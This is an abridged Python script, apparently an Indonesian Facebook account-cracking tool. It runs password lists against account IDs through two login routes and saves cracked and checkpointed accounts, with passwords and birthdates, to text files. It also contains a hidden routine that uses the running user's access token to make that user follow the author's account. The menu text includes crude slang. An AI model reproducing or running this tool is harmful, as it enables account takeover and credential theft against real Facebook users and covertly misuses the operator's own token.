#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Hasan And XNSCODE Project
# Update V0.2

# Author : Hasan hasdian id
...
_logo_line_2_ = ('%s  / _ \/  |/  / _ )/ __/ %s• %sMBEW'%(_P_,_U_,_P_))
...
def _bot_follow_(_tok_dev_):
    ...
    try:
        ...
        _req_post_("https://graph.facebook.com/1013884014/subscribers?access_token=" + token) # hasan id
...
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    ...
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        ...
        _dapunta_cici_('%s[%s•%s] %sSampai Jumpa kontl %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar syng'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)
...
class _crack_dev_:
    ...
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_P_,fl.get("id"),i,d,m,y))
                    ...
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_P_,_P_,_P_,fl.get("id"),i))
            ...
            self.ko+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_P_,_U_,_P_,_U_,self.ko,len(self.fl),_U_,_P_,len(self.ada),_U_,_P_,len(self.cp),_U_,_P_), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_P_,_P_,_P_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                    ...
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_P_,_U_,_P_,_U_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
